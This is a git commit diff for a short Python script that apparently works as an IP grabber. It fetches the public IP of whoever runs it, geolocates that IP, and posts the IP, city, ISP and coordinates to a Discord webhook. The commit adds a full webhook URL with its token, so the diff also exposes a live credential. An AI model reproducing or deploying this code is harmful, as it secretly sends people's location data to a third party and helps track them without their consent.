71d62581bc2e96987da9118ae1d523c0f65f3214
Nova1235-png <sleyzzie@gmail.com>
2026-05-05 18:26:10 +0200

    Update and rename main.py to python main.py

--- python main.py
+++ python main.py
@@ -3,21 +3,21 @@ import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook-url-here")
+hook = Webhook("https://discord.com/api/webhooks/1501258166178942986/207eJHjG1D1uNp4dbVw-uPo1UefJnLHx2CBLzaHqokhzaX3bpKL6p7o0N1PZsmwA0hUX")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
 
 r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
 geo = r.json()
-embed = Embed()
+print(geo)
+embed = Embed()                                                                                                                                                            
 fields = [
     {'name': 'IP', 'value': geo['query']},
     {'name': 'ipType', 'value': geo['ipType']},
     {'name': 'Country', 'value': geo['country']},
     {'name': 'City', 'value': geo['city']},
     {'name': 'Continent', 'value': geo['continent']},
-    {'name': 'Country', 'value': geo['country']},
     {'name': 'IPName', 'value': geo['ipName']},
     {'name': 'ISP', 'value': geo['isp']},
     {'name': 'Latitute', 'value': geo['lat']},
